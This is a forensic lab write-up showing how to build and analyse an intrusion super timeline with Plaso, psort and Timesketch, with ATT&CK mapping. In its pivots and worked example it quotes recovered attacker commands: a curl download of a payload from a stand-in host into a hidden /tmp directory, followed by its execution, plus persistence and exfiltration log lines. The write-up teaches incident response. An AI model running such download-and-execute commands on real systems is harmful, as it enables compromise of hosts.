Forensics Timeline Analysis with Plaso and Timesketch

AdvancedSecurity~7 hours
log2timelinePlasoTimesketchKQL

I built a forensic super timeline with Plaso/log2timeline, correlating filesystem, registry, and log artifacts into a single chronological view analyzed in Timesketch. The unified timeline reconstructed an intrusion sequence across four evidence sources down to minute-level ordering.

This writeup walks the entire workflow end to end: verifying the evidence image, extracting every timestamped artifact with log2timeline.py, filtering millions of events down to the investigation window with psort.py, and importing the result into Timesketch where the attack chain gets tagged, annotated, and mapped to MITRE ATT&CK. Every command is included with the output you should expect and the mistakes I hit along the way, so the lab can be reproduced from scratch.

The toolchain is deliberately unglamorous: Plaso for extraction, psort for filtering, Timesketch for analysis. The same pipeline scales from a single lab image to a multi-host incident — only the storage files and the number of sketches change.

Objective & Context

A super timeline merges every timestamped artifact into one ordered sequence, exposing the order of attacker actions. This lab implements the Plaso workflow and maps observed events to MITRE ATT&CK, supporting NIST SP 800-86 analysis.

The core problem in any intrusion investigation is fragmentation. The filesystem knows when files appeared, the registry knows when persistence was written, the Windows Event Log (or syslog) knows when processes and network connections happened, and shell history knows what the operator typed — but each source has its own format, its own timestamp conventions, and its own viewer. Reviewing them one at a time makes it almost impossible to answer the question that actually matters: what did the attacker do, in what order, and how fast? A super timeline solves this by normalizing every artifact into a single schema of (timestamp, source, description) events, sorted chronologically. Once the data is ordered, causal chains become visible: a dropped payload is followed 37 seconds later by a Run key write, which is followed two minutes later by an outbound connection — a sequence no single log would show on its own.

The lab scenario: a Linux web server with a Windows jump host was compromised. The disk image from the dead box acquisition (see the Dead Box Forensics lab) is the input here. The investigation window was scoped to June 10-14, 2026 based on the first IDS alert, and the goal is a minute-ordered narrative from initial execution to exfiltration.

  • T1059 Command and Scripting Interpreter – shell history and prefetch reveal execution order.
  • T1547 Boot or Logon Autostart Execution – persistence entries surface in the timeline.

Mapping events to ATT&CK techniques is not decoration: it forces each timeline pivot to be tied to a defensible analytic claim, which is what makes the final report hold up under review. NIST SP 800-86 frames this as the "analysis" phase of incident handling — the timeline is the primary artifact that phase produces.

It is worth understanding how Plaso structures its output, because it shapes every later step. Each extracted event carries a timestamp (normalized internally to UTC microseconds since epoch), a timestamp description saying what that timestamp means (mtime, Creation Time, Last Visited), the parser that produced it, and a human-readable message. A single file on disk typically yields four filesystem events (the MACB quartet), and one registry key write can yield two. That is why event counts run into the millions — and why the timestamp_desc column matters when reading the CSV: "content modified" and "file created" are different forensic claims, and attackers who timestomp files are counting on the analyst not checking which is which.

The four evidence sources this case hinges on, and where they live on disk:

  • Filesystem metadata (filestat parser): inode and MFT timestamps for every allocated path. Proves what existed when — here, the payload appearing in /tmp/.x/ at 14:03:11Z.
  • Registry hives (winreg parser): SOFTWARE, SYSTEM, and per-user NTUSER.DAT hives on the Windows jump host. Proves persistence and configuration changes — the Run key write at 14:03:48Z.
  • Event logs (winevtx and syslog parsers): .evtx files under C:\Windows\System32\winevt\Logs on the jump host and /var/log on the web server. Proves execution, logons, and connections — the outbound session at 14:05:02Z.
  • Shell history (bash_history parser): per-user ~/.bash_history. Proves operator intent — the literal commands typed, including the typos and mistyped paths no automated tooling would produce.

Environment & Prerequisites

  • A forensic disk image (from dead box acquisition).
  • Plaso 20231xx; Timesketch instance for collaborative review.
  • Defined investigation window and known-good baseline times.

A few things are worth expanding on before touching the image:

  • Evidence handling. The image must be a verified copy with a documented acquisition hash (see the dead box lab). All analysis runs against the image file, never the original media, and the image is mounted read-only if mounted at all — log2timeline reads raw images directly, so mounting is usually unnecessary.
  • Hardware. Budget disk space at roughly 2–3× the image size: the .plaso storage file for this 120 GB image came out at 4.1 GB, plus the CSV exports and Timesketch's OpenSearch index on top. 16 GB of RAM keeps an 8-worker extraction from swapping.
  • Plaso install. The easiest supported route on Ubuntu is the GIFT PPA, which keeps log2timeline, psort, and pinfo in sync:

Installing Plaso from the GIFT PPA (Ubuntu 22.04)

sudo add-apt-repository ppa:gift/stable
sudo apt update
sudo apt install plaso-tools
log2timeline.py --version
plaso - log2timeline version 20230408
  • Timesketch. A small docker-compose deployment is enough for a solo lab; for team review use a shared instance so tags and comments are collaborative. Verify connectivity before you have gigabytes of CSV to push. The importer client is plain Python: pip install timesketch-import-client on the analysis workstation.
  • Investigation window. Write down the start and end of the window (here: 2026-06-10 00:00:00 to 2026-06-14 23:59:59 UTC) before filtering. Filtering to a window you defined after seeing the data invites confirmation bias.
  • Timezone discipline. Decide now that everything is UTC. Plaso stores timestamps as UTC microseconds since epoch internally, but parsers must be told the source timezone (via -z) for artifacts that record local time. Mixing zones is the number-one cause of false event ordering.

For the Timesketch side, the official docker-compose release is a short setup. The only lab-specific steps are creating the analyst account and a sketch to import into:

Bringing up a local Timesketch instance

curl -s -O https://raw.githubusercontent.com/google/timesketch/master/docker/release/docker-compose.yml
curl -s -O https://raw.githubusercontent.com/google/timesketch/master/docker/release/config.env
sudo docker compose up -d
sudo docker compose exec timesketch-web tsctl create-user admin

sudo docker compose ps

One more prerequisite that bites people: image format. log2timeline reads raw (dd) and EWF (E01) images directly, but a VMDK or VHD must be converted or attached first (qemu-img convert -O raw disk.vmdk case.img). Also check the flag spelling for your version — current Plaso accepts --storage-file, while older tutorials show --storage_file; log2timeline.py --help is the authority.

Step-by-Step Execution

1. Verify the image before touching it

Before any analysis, re-hash the image and compare against the acquisition log. Timeline analysis takes hours; discovering halfway through that you were working on a corrupted copy is an expensive lesson. This takes two minutes and settles chain of custody for everything that follows. Log the verification itself (who, when, result) in the custody record — the hash check is part of the evidence trail, not just housekeeping.

Re-verify the acquisition hash

sha256sum /evidence/case.img
cat /evidence/case.acquisition.log | grep SHA256
a1b2c3d4...  /evidence/case.img
SHA256: a1b2c3d4...   # match = proceed

While you are here, confirm what format the image actually is — it determines whether log2timeline can read it directly:

Confirming the image format

file /evidence/case.img
# /evidence/case.img: data                          (raw dd image - OK)
# /evidence/case.E01: EWF/Expert Witness format     (EWF image - also OK)

Common mistake: skipping this because "the dead box lab already hashed it." Hashes from last week say nothing about the file on disk today. Verify: the two values must be identical, character for character.

2. Generate the timeline from the image

log2timeline.py walks the image, runs every applicable parser (filesystem metadata, registry hives, event logs, browser history, shell history, prefetch, and dozens more) and writes all extracted events into a Plaso storage file. The -z UTC flag tells parsers to interpret source-local timestamps as UTC, which keeps the whole timeline on one clock.

log2timeline.py -storage-file case.plaso case.img

For this case the full command was slightly longer: partition and volume-shadow-copy scanning were enabled explicitly, and the worker count was raised to use all cores, which cut the extraction from roughly 90 minutes to about 25 on an 8-core machine. The --vss_stores all flag deserves emphasis: volume shadow copies are snapshots of the volume at earlier points in time, and parsing them effectively gives you several historical timelines for free — including artifacts the attacker deleted from the live volume.

Full extraction command used in this lab

log2timeline.py --storage-file case.plaso \
  --partitions all --vss_stores all \
  --workers 8 -z UTC --status_view linear \
  /evidence/case.img
Source path		: /evidence/case.img
Source type		: storage media image
Processing time		: 00:24:51
Tasks: Queued: 0, Processing: 0, Merging: 0, Abandoned: 0, Total: 184213
Events: 4,812,336  Errors: 12

The important numbers: over 4.8 million events from 184k processed tasks, with only 12 extraction errors. A small non-zero error count is normal (locked or corrupt artifacts); hundreds of thousands is not. The resulting case.plaso is a SQLite-based storage file (4.1 GB here) — self-contained, so it can be archived or handed to another analyst without the original image.

For scoped re-runs later in the case (not the first pass over new evidence), a targeted parser list extracts just the families you care about. The trade-off is real: faster runs and smaller storage files, but anything outside the list is simply absent from the storage file — you cannot pivot to what was never parsed.

Targeted re-extraction for a scoped pivot

log2timeline.py --storage-file case_scoped.plaso \
  --parsers "filestat,winevtx,winreg,bash_history,prefetch,webhist,syslog" \
  -z UTC /evidence/case.img

Common mistake: running the extraction without -z and discovering at the psort stage that registry events are five hours off from event-log events. Verify: check the extraction header — it echoes the configured timezone — and confirm with pinfo.py in the next step.

3. Inspect the storage file with pinfo.py

Before filtering anything, look at what you actually extracted. pinfo.py reports the sessions, parser hit counts, and event sources in the storage file. This is the sanity gate: if a parser you expected (say winreg or bash_history) shows zero events, the image, the mount, or the partition selection is wrong — better to learn that now than after an import.

Summarize the Plaso storage file

pinfo.py case.plaso
pinfo.py --verbose case.plaso | less
************************** Plaso Storage Information ***************************
            Filename : case.plaso
      Format version : 20230327
Serialization format : json
--------------------------------------------------------------------------------
************************** Events generated per parser **************************
Parser (plugin) name : Number of events
--------------------------------------------------------------------------------
            filestat : 2981441
            winevtx  : 1031202
             winreg  :  402118
       bash_history  :    1184
           prefetch  :     931
--------------------------------------------------------------------------------
Total: 4812336

Four evidence sources of interest are confirmed present: filesystem metadata (filestat), event logs (winevtx), registry (winreg), and shell history (bash_history). The 1,184 bash-history events and 931 prefetch records are small counts but high-signal — exactly the kind of artifact a timeline exists to surface.

Two more pinfo checks are worth the seconds they take. First, the source section confirms every partition (and, with --vss_stores all, every volume shadow copy) contributed events — shadow copies often hold the pre-cleanup copy of a hive or log. Second, when a case produces more than one storage file, pinfo.py --compare diffs them, which is how the reproducibility check in the validation section was actually performed. The verbose output also echoes the exact command line of each extraction session — a free audit trail of how the storage file was produced.

Common mistake: assuming "log2timeline finished" means "everything parsed." Verify: parser counts in pinfo must be non-zero for each artifact family the case depends on, and the reported partition list should cover every partition on the image.

4. Filter to the investigation window with psort

psort.py reads the storage file, applies an event filter, and writes the survivors out in the format you choose. The l2tcsv output plugin produces the classic 17-column CSV that Timesketch (and Excel, and grep) can consume. The filter expression "date > '2026-06-10 00:00:00'" drops everything before the window opened; an upper bound is added the same way.

psort.py -o l2tcsv -w timeline.csv case.plaso "date > '2026-06-10 00:00:00'"

Bounding both ends of the window

psort.py -o l2tcsv -w timeline.csv case.plaso \
  "date > '2026-06-10 00:00:00' AND date < '2026-06-15 00:00:00'"

The l2tcsv header defines the 17 columns every row carries; the two to watch while reading are source (which parser produced the event) and desc (what actually happened):

date,time,timezone,MACB,source,sourcetype,type,user,host,short,desc,version,filename,inode,notes,format,extra

The filtered slice of the timeline already tells the story. Three consecutive events from three different sources:

2026-06-12T14:03:11Z  FILE  /tmp/.x/payload  created
2026-06-12T14:03:48Z  REG   Run key persistence added
2026-06-12T14:05:02Z  LOG   outbound 203.0.113.45:443

Read chronologically: a payload lands in a hidden directory under /tmp, 37 seconds later a persistence mechanism is written to an autostart location, and 74 seconds after that the host opens an outbound connection to 203.0.113.45 on 443. That is an execution-to-callback chain (T1059, T1547, and C2) in under two minutes — visible only because all three sources are on the same clock.

Note that l2tcsv is not the only output: -o dynamic prints a compact table for terminal eyeballing, -o json_line gives one JSON object per event for scripting, and -o xlsx produces a spreadsheet — though Excel chokes well before 312k rows, so CSV stays the practical exchange format at this scale.

Common mistake: filter-expression quoting. The whole expression needs double quotes and the date literals single quotes; a shell-eaten quote produces a syntax error or, worse, an empty result set that looks like "no events in window." Verify: the CSV row count (wc -l timeline.csv) should be large but far smaller than the 4.8M total — here, about 312k rows.

5. Take targeted pivots with parser-level filters

A 312k-row CSV is still too much to read linearly. The next move is targeted pivots: extract only the high-signal artifact families into their own files. psort filter expressions can match on the parser and data_type attributes, which is how you pull just execution artifacts or just persistence artifacts.

Pivot: execution artifacts (prefetch + shell history)

psort.py -o l2tcsv -w exec.csv case.plaso \
  "parser is 'prefetch' OR parser is 'bash_history'"

Pivot: registry autostart locations

psort.py -o l2tcsv -w persist.csv case.plaso \
  "parser is 'winreg' AND message contains 'Run'"

The execution pivot is immediately readable — the operator's own commands, in order, with the payload execution sitting exactly where the filestat birth time said it would:

2026-06-12T14:02:57Z  bash_history  curl -s http://203.0.113.45/p -o /tmp/.x/payload
2026-06-12T14:03:22Z  bash_history  chmod +x /tmp/.x/payload && /tmp/.x/payload
2026-06-12T14:03:26Z  prefetch      SYSUPD.EXE last run (jump host)

And the persistence pivot yields the key write itself, with the registry key's own Last Written timestamp as the event time:

2026-06-12T14:03:48Z  winreg  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
                              "sysupd" = C:\ProgramData\sysupd.exe  (key Last Written)

psort also ships analysis plugins that annotate events during output. The tagging plugin applies rule-based tags (for example execution, browser_search, logon) and unique_domains_visited summarizes every domain seen in browser and network artifacts — a fast way to shortlist C2 candidates:

Tag events and summarize domains during export

psort.py --analysis tagging,unique_domains_visited \
  -o l2tcsv -w timeline_tagged.csv case.plaso \
  "date > '2026-06-10 00:00:00'"
domain                     : count
cdn-metrics.example.net    : 2,341
upd-srv.203-0-113-45.host  : 87       <-- outlier, matches the C2 session
...

Common mistake: over-filtering to a single artifact type and losing context. A prefetch record alone does not prove malicious execution; it proves a binary ran. Verify: every pivot conclusion should be corroborated by at least one other source in the full timeline — execution (prefetch) plus payload creation (filestat) plus callback (network log) is a defensible chain.

6. Import into Timesketch

With the filtered CSV in hand, push it into a Timesketch sketch for collaborative analysis. The importer client uploads the file, Timesketch indexes it into OpenSearch, and the timeline becomes searchable through the web UI.

timesketch_importer -u admin -sketch 1 timeline.csv

Full import with explicit host and timeline name

timesketch_importer --host https://timesketch.lab.local \
  --user admin --sketch_id 1 \
  --timeline_name "case-2026-06-filtered" \
  timeline.csv
[2026-06-17 20:12:04] Uploading timeline.csv (312,448 events)
[2026-06-17 20:12:41] Timeline 7 created in sketch 1
[2026-06-17 20:13:19] Indexing complete: status = ready

For large or recurring cases, skip the CSV entirely: psort's timesketch output plugin streams events directly from the storage file into a sketch (psort.py -o timesketch --sketch_id 1 case.plaso "..."). The CSV route was used here because the intermediate file doubles as a reviewable deliverable. If an upload does stall, split the CSV by week and import the parts as separate timelines in the same sketch — Timesketch queries across all timelines in a sketch at once.

Common mistake: importing the unfiltered 4.8M-event timeline "just in case." Indexing takes forever and every query drowns in noise. Verify: the event count Timesketch reports for the new timeline should match the CSV row count exactly.

7. Query, tag, and build the attack narrative

Inside the sketch, the workflow is iterative: run a query, star the events that matter, apply a label or tag, and let the next query pivot off the last finding. Timesketch search accepts field-scoped queries, which map cleanly onto the artifact families from step 5.

Representative Timesketch queries used in this case

# All process-creation events around the payload time
data_type:"windows:evtx:record" AND event_identifier:4688
  AND timestamp:[2026-06-12T14:00 TO 2026-06-12T14:10]

# Persistence writes to autostart keys
message:"\\CurrentVersion\\Run" AND tag:"persistence"

# Everything involving the suspected C2 address
"203.0.113.45"

Each hit that belongs in the final narrative gets a star and a comment explaining why it is evidence (for example: "Run key written 37s after payload creation — T1547"). Timesketch's analyzers then automate the dull parts: the feature-extraction and Sigma analyzers re-tag the whole timeline against community rules, and the gap analyzer flags time ranges with no events at all — a deleted-log indicator worth its own finding. The end state is a saved story in the sketch that walks the chain: payload drop → execution → persistence → C2 callback → staging → exfiltration, each step backed by starred events from at least two sources.

Analyzers as they reported in the sketch for this case

browser_search     : done - 14 events tagged
feature_extraction : done - 312 events tagged (execution, logon)
sigma              : done - 6 events tagged (2 rules matched)
gap_analyzer       : done - 1 gap found (2026-06-12 14:22-14:40)

Two Timesketch features earn their keep at this stage. Saved searches turn each query above into a one-click view the whole team shares, so "the persistence query" means the same thing to everyone reviewing the case. And the story view doubles as a report skeleton: each starred event drops in with its timestamp, source, and comment, which makes the ATT&CK mapping in the final report a byproduct of the analysis rather than a separate writing task.

Common mistake: treating starred events as proof without comments. Six weeks later, nobody — including you — remembers why an event was starred. Verify: every pivot in the final story links to the underlying events and carries a one-line justification and an ATT&CK technique.

Worked Example: Reconstructing the Chain

Pulling the starred events out of the sketch, the full reconstructed sequence for June 12 looked like this. Each line names its evidence source; note how no single source carries more than a fragment of the story:

2026-06-12T13:58:44Z  LOG    SSH password auth accepted for www-data from 198.51.100.23
2026-06-12T14:02:57Z  SHELL  curl -s http://203.0.113.45/p -o /tmp/.x/payload
2026-06-12T14:03:11Z  FILE   /tmp/.x/payload created (birth time)
2026-06-12T14:03:22Z  SHELL  chmod +x /tmp/.x/payload && /tmp/.x/payload
2026-06-12T14:03:48Z  REG    HKLM\...\Run "sysupd" = C:\ProgramData\sysupd.exe (jump host)
2026-06-12T14:05:02Z  LOG    outbound TCP 203.0.113.45:443 (C2 callback)
2026-06-12T14:22:10Z  LOG    syslog daemon stopped; entries 14:22-14:40 deleted (T1070)
2026-06-12T16:41:33Z  FILE   /var/www/html/.cache/stage.tar.gz created (staging)
2026-06-12T16:44:05Z  LOG    182 MB outbound to 203.0.113.45:443 (exfiltration)

The initial access line is itself a good example of pivoting: it surfaced from a Timesketch query for data_type:"syslog:line" AND "Accepted password" inside the window, run only because the shell-history events at 14:02 implied someone was already on the box. The timeline told us that access happened; going back to the logs told us how.

Three observations from this chain. First, the initial access vector (password auth for a service account) only exists in the SSH logs — nothing else recorded it. Second, the persistence write on the Windows jump host at 14:03:48Z shows the attacker pivoted laterally within a minute of landing on the web server, which changed the scope of the entire response. Third, the anti-forensic gap (14:22-14:40) is bracketed by the C2 callback and the staging archive, which is exactly where you would expect cleanup — and the deleted syslog entries were later recovered from a volume shadow copy, thanks to --vss_stores all in step 2.

This is the answer to the question the whole lab exists to answer: what did the attacker do, in what order, and how fast — initial access to exfiltration in 2 hours 45 minutes, with persistence established inside the first five.

Validation & Testing

Verify the reconstructed sequence against an independent log source (for example firewall logs) to confirm ordering. Pass criteria: a coherent attack narrative from initial execution to exfiltration with no unexplained time gaps.

Concretely, validation in this lab meant four checks:

  • Cross-source corroboration. The outbound connection at 14:05:02Z in the host logs was matched against the perimeter firewall logs: same destination, same port, timestamp within 3 seconds. Independent sources agreeing on order is the strongest signal the timeline clock is right.
  • Timezone spot check. Three artifacts with known wall-clock context (a screenshot of the IDS alert, a user's login, a scheduled cron job) were located in the timeline and confirmed to sit at their expected UTC positions.
  • Gap analysis. Timesketch's gap analyzer was run across the window; the only gap found (14:22–14:40 on the 12th) coincided with deleted syslog entries recovered separately — itself evidence of T1070 indicator removal.
  • Reproducibility. The full pipeline was re-run from the image on a clean machine; the filtered CSV matched the original run event-for-event.

The reproducibility check deserves its command, because "same input, same output" is the property that makes the analysis defensible:

Re-run and diff the filtered output

log2timeline.py --storage-file rerun.plaso --partitions all \
  --vss_stores all --workers 8 -z UTC /evidence/case.img
psort.py -o l2tcsv -w rerun.csv rerun.plaso \
  "date > '2026-06-10 00:00:00' AND date < '2026-06-15 00:00:00'"
diff timeline.csv rerun.csv && echo "REPRODUCIBLE"
REPRODUCIBLE

For the storage-level view, pinfo.py --compare case.plaso rerun.plaso confirms both storage files hold the same set of event identifiers, closing the loop that the CSV equality implies. If either check ever fails, suspect nondeterministic parser behaviour on a corrupt artifact before suspecting the tooling.

Troubleshooting

The five issues below are the ones that actually cost time in this lab, in roughly the order they appear in the workflow:

  • Timezone skew (false ordering): registry events appear hours off from event-log entries. Cause: extraction ran without a timezone or the source recorded local time. Fix: re-run log2timeline with -z UTC, and confirm parser-level zones with pinfo.py --verbose. Never "fix" skew by hand-editing timestamps in the CSV.
  • Timeline too large / extraction runs for hours: tens of millions of events, mostly filestat noise. Fix: restrict parsers with --parsers "filestat,winevtx,winreg,bash_history,prefetch,webhist", raise --workers to the core count, and filter early with a tight psort date window. A scoped parser list took this case's working set from 4.8M to about 1.9M events with no loss of relevant artifacts.
  • Missing artifacts (parser count zero in pinfo): expected evidence (bash history, a registry hive) is absent from the storage file. Cause is usually partition selection or the image not being fully read. Fix: confirm the image mounts read-only and all partitions were scanned — re-run with --partitions all --vss_stores all — then re-check parser counts with pinfo.py. Volume shadow copies in particular often hold the pre-cleanup version of a hive.
  • psort filter returns zero rows: almost always a quoting or attribute-name problem. The expression needs double quotes outside and single quotes around date literals ("date > '2026-06-10'"); attribute names are case-sensitive (parser, not Parser). Test incrementally: start with the date filter alone, confirm a row count, then add clauses one at a time.
  • Events out of order despite correct timezone: the machine's clock itself moved — NTP corrections, manual changes, or VM snapshot reverts all shift timestamps mid-incident. Fix: search the timeline for time-change events (Windows Event ID 4616, Linux clock_settime in syslog), document each shift, and interpret ordering across a shift with caution. Plaso's own "system time changed" detection flags many of these automatically.

From Timeline to Report

Analysis is only half the deliverable; the other half is packaging it so a reviewer can re-derive every claim without trusting you. Four artifacts left the case folder:

  • The filtered CSV (timeline.csv) — the raw evidence view, SHA-256 hashed and archived alongside the image and storage file so any step can be re-run.
  • The Timesketch story — the narrative with embedded event links, so every sentence in the report is one click from the underlying event.
  • The ATT&CK mapping table — technique, supporting events, and a confidence level per claim; anything resting on a single source is marked as such.
  • The gap log — each unexplained time range, its cause (deletion, clock shift, logging disabled), and what was done to recover coverage.

Excerpt from the ATT&CK mapping deliverable

T1078 Valid Accounts         - SSH auth event (LOG 13:58:44Z)         - confidence: high
T1059 Command Interpreter    - bash_history entries (SHELL 14:02)     - confidence: high
T1547 Autostart Execution    - Run key write (REG 14:03:48Z)          - confidence: high
T1071.001 Web Protocols (C2) - outbound 443 session (LOG 14:05:02Z)   - confidence: high
T1070 Indicator Removal      - syslog gap + recovered entries         - confidence: medium
T1041 Exfil over C2 Channel  - 182 MB transfer (LOG 16:44:05Z)        - confidence: high

Note the one "medium" rating: the deleted-syslog claim rests on recovered shadow-copy entries plus the gap itself, not on a live-source confession, so the report says exactly that. Calibrated confidence is what separates a timeline from a just-so story.

Key Takeaways

  • A super timeline's entire value is ordering: normalize every source to UTC (-z UTC) before anything else, or the ordering is fiction.
  • Verify before and after: hash the image before extraction, check parser counts with pinfo.py after it.
  • Filter aggressively but keep the full storage file — the window-bounded CSV is for analysis, the .plaso file remains the complete evidence view.
  • No conclusion from a single source: execution + persistence + network callback from three artifact families is a chain; any one alone is a hint.
  • Annotate as you go in Timesketch — starred events with comments and ATT&CK tags are the report, not preparation for it.
  • Gaps are evidence too: a hole in the timeline at the right moment points to anti-forensics, not missing tooling.
  • Reproducibility is the credibility test: if a colleague cannot re-run the pipeline and get the same CSV, the narrative is not ready to ship.
